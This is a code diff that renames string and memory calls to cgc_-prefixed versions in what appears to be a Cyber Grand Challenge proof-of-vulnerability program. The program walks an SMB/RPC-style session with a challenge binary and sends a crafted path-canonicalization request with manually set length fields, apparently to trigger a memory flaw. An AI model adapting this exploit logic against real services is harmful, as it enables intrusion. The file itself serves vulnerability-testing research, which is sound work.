@@ -76,7 +76,7 @@ int strcat(char *restrict s1, const char *restrict s2) {
     return(0);
   }
 
-  for (i = strlen(s1), j = 0; j < strlen(s2); i++, j++, length++) {
+  for (i = cgc_strlen(s1), j = 0; j < cgc_strlen(s2); i++, j++, length++) {
     s1[i] = s2[j];
   }
   s1[i] = '\0';
@@ -118,44 +118,44 @@ int main(void) {
   SendToCB(negotiate, sizeof(negotiate));
   ReceiveFromCB(negotiate_response, 30);
   uint32_t sessionKey = *(uint32_t *)&negotiate_response[24];
-  memcpy(session + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(session + 22, (char *)&sessionKey, 4);
   SendToCB(session, sizeof(session));
   ReceiveFromCB(session_response, 27);
-  memcpy(tree_connect + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(tree_connect + 22, (char *)&sessionKey, 4);
   SendToCB(tree_connect, sizeof(tree_connect));
   ReceiveFromCB(tree_connect_response, 34);
   uint32_t connectionID = *(uint32_t *)&tree_connect_response[30];
-  memcpy(file_create + 22, (char *)&sessionKey, 4);
-  memcpy(file_create + 28, (char *)&connectionID, 4);
+  cgc_memcpy(file_create + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(file_create + 28, (char *)&connectionID, 4);
   SendToCB(file_create, sizeof(file_create));
   ReceiveFromCB(file_create_response, 34);
   uint16_t fileID = *(uint16_t *)&file_create_response[32];
-  memcpy(transaction_bind + 22, (char *)&sessionKey, 4);
-  memcpy(transaction_bind + 28, (char *)&connectionID, 4);
-  memcpy(transaction_bind + 32, (char *)&fileID, 2);
+  cgc_memcpy(transaction_bind + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(transaction_bind + 28, (char *)&connectionID, 4);
+  cgc_memcpy(transaction_bind + 32, (char *)&fileID, 2);
   SendToCB(transaction_bind, sizeof(transaction_bind));
   ReceiveFromCB(transaction_bind_response, 44);
   uint32_t bindID = *(uint32_t *)&transaction_bind_response[40];
-  memcpy(transaction_write_enum + 22, (char *)&sessionKey, 4);
-  memcpy(transaction_write_enum + 28, (char *)&connectionID, 4);
-  memcpy(transaction_write_enum + 32, (char *)&fileID, 2);
-  memcpy(transaction_write_enum + 38, (char *)&bindID, 4);
+  cgc_memcpy(transaction_write_enum + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(transaction_write_enum + 28, (char *)&connectionID, 4);
+  cgc_memcpy(transaction_write_enum + 32, (char *)&fileID, 2);
+  cgc_memcpy(transaction_write_enum + 38, (char *)&bindID, 4);
   SendToCB(transaction_write_enum, sizeof(transaction_write_enum));
   ReceiveFromCB(transaction_write_enum_response, 43);
   uint16_t responseLength = *(uint16_t *)&transaction_write_enum_response[41];
   ReceiveFromCB(&transaction_write_enum_response[43], responseLength );
   
   char *serviceStart = &transaction_write_enum_response[45];
-  memcpy(transaction_write_canon + 22, (char *)&sessionKey, 4);
-  memcpy(transaction_write_canon + 28, (char *)&connectionID, 4);
-  memcpy(transaction_write_canon + 32, (char *)&fileID, 2);
-  memcpy(transaction_write_canon + 38, (char *)&bindID, 4);
+  cgc_memcpy(transaction_write_canon + 22, (char *)&sessionKey, 4);
+  cgc_memcpy(transaction_write_canon + 28, (char *)&connectionID, 4);
+  cgc_memcpy(transaction_write_canon + 32, (char *)&fileID, 2);
+  cgc_memcpy(transaction_write_canon + 38, (char *)&bindID, 4);
   uint16_t length;
   length = strcat(transaction_write_canon + 46, serviceStart);
   transaction_write_canon[46+length] = '\xd2';
   length += 1;
 
-  int serviceLength = strlen(serviceStart);
+  int serviceLength = cgc_strlen(serviceStart);
   if (serviceLength > 64)
   {
     _terminate(0);
@@ -182,11 +182,11 @@ int main(void) {
   }
 
   length += strcat(transaction_write_canon + 46 + length, badpath);
-  memcpy(transaction_write_canon + 44, (char *)&length, 2); // Request Length
+  cgc_memcpy(transaction_write_canon + 44, (char *)&length, 2); // Request Length
   length += 10;  
-  memcpy(transaction_write_canon + 34, (char *)&length, 2); // Data Length
+  cgc_memcpy(transaction_write_canon + 34, (char *)&length, 2); // Data Length
   length += 33;
-  memcpy(transaction_write_canon + 1, (char *)&length, 2); // Message length
+  cgc_memcpy(transaction_write_canon + 1, (char *)&length, 2); // Message length
   SendToCB(transaction_write_canon, length + 6);
   ReceiveFromCB(transaction_write_canon_response, 34);
   return 0;
